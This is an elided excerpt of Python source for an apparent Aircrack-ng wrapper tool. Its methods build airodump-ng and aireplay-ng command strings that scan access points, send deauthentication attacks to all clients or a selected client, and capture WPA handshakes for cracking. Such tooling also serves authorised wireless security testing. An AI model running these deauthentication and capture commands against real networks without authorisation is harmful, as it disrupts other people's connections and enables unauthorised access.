...
class aircrackObj(object):
    ...
    def showLogo(self):
        ...
        "gICAgCg==")
        startupInfo = returnGreenDeep(self.colors,"Developed by ANJEESHNU, Using the Aircrack-ng tool. 2021-2021.")
    ...
    def gatherInitialData(self):
        ...
        fetchAllAPs = "~/.godseye/air/*/src/airodump-ng -a -w {}".format(self.csvFilePath)
    ...
    def deauthAllClients(self):
        ...
        finalDeauthCommand = ("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'"
                              " -bg '#FFFFFF' -fg '#000000' -e 'trap \":\" SIGINT; ~/.godseye/air/*/src/aireplay-ng"
                              " -0 {0} -a {1} {2} --ignore-negative-one ; trap - SIGINT ; ~/.godseye/air/*/src/airodump-ng"
    ...
    def deauthSelectedClient(self):
        ...
        getClientsCommand = ("~/.godseye/air/*/src/airodump-ng"
        ...
        finalSelectiveDeauthCommand = ("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: {0} & CAPTURING'"
                                       " -bg '#FFFFFF' -fg '#000000' -e 'trap \":\" SIGINT ; ~/.godseye/air/*/src/aireplay-ng"
                                       " -0 {1} -a {2} -c {0} {3} --ignore-negative-one ; trap - SIGINT ; ~/.godseye/air/*/src/airodump-ng"
    ...
    def dontDeauthClient(self):
        ...
        passiveHandshakeCommand = ("xterm -geometry 100x25+4320+7640 -title 'PASSIVELY WAITING FOR HANDSHAKE...'"
                                   " -bg '#FFFFFF' -fg '#000000' -e '~/.godseye/air/*/src/airodump-ng"
